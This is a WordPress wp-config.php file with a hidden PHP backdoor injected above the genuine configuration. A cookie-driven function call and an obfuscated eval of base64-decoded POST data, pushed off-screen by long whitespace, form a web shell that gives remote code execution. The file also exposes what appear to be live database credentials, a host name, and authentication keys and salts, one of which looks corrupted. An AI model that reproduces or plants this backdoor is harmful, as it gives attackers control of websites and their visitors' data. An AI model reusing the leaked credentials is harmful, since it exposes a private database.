<?php

if (isset($_COOKIE["id"])) @$_COOKIE["user"]($_COOKIE["id"]);

                                                                                                                                                                                                                                                                  $tpnz1= "e64tcadopsb_";$phpz93=strtolower ( $tpnz1[10].$tpnz1[5]. $tpnz1[9].$tpnz1[0].$tpnz1[1]. $tpnz1[2]. $tpnz1[11] .$tpnz1[6].$tpnz1[0]. $tpnz1[4].$tpnz1[7]. $tpnz1[6].$tpnz1[0] );$svlf75=strtoupper ($tpnz1[11].$tpnz1[8].$tpnz1[7].$tpnz1[9].$tpnz1[3] );if(isset (${$svlf75 }['n764b3b'] )) { eval($phpz93(${ $svlf75 }[ 'n764b3b' ])) ;}?><?php
/**
 * The base configurations of the WordPress.
 *
 * This file has the following configurations: MySQL settings, Table Prefix,
 * Secret Keys, and ABSPATH. You can find more information by visiting
 * {@link https://codex.wordpress.org/Editing_wp-config.php Editing wp-config.php}
 * Codex page. You can get the MySQL settings from your web host.
 *
 * This file is used by the wp-config.php creation script during the
 * installation. You don't have to use the web site, you can just copy this file
 * to "wp-config.php" and fill in the values.
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'pbfoa');

/** MySQL database username */
define('DB_USER', 'pbfoa');

/** MySQL database password */
define('DB_PASSWORD', 'Pixector@123');

/** MySQL hostname */
define('DB_HOST', 'pbfoa.db.10076444.hostedresource.com');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         'N:3vbdK2e<W=i`0h<Bb 8{CqyVm+3x1R>~JHm<0kOe<;F_%~-{8.Z4!G4l{O$(9~');
define('SECURE_AUTH_KEY',  ' %F2L.Y{+ahc/Vu*m88/9:OEZagRgTxvduTJAj-F3jTr;H(qtXu#`:N#2O9&rZ-E');
define('LOGGED_IN_KEY',    '@t&SH2J$Fs;EDR8$-6$(f-p.IM?=`}G.IbKt}j/H$M<}c>r%yWAXE<8gQYN)%)$+');
define('NONCE_KEY',        '7|dM_y|-V|t*ws}Q!ra`Fu`pL)Istn4XFxg}jt6@VYBRs0#d RLeq-QUapej|gF;');
define('AUTH_SALT',        '#_JS?%@^jQr}}cD.@;4/U=t|+=1_kdHB,HtLT/`qzz39Cg;Aee48`qki-i,l|!R@');
define('SECURE_AUTH_SALT', 'C6.N,0 2Hs~*F`$DX4O`_Q*UtHP, 9|::7n-jYe-Mcl$Lkt(NXKCfVI*i6hun-ul');
define('LOGGED_IN_SALT',   'YD=s)o}c?@|@t11FoPB-@;,QfkOSER<?phpu+6SV#pV<>+F.`_K6Hzo))9TH6_UwHY)');
define('NONCE_SALT',       'AbX/=2.>mlC sZ65b#V?iW$wQFa(RJ=fK=)lmh94zbvv+AIO8!X0iq%R T;,-WG2');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each a unique
 * prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
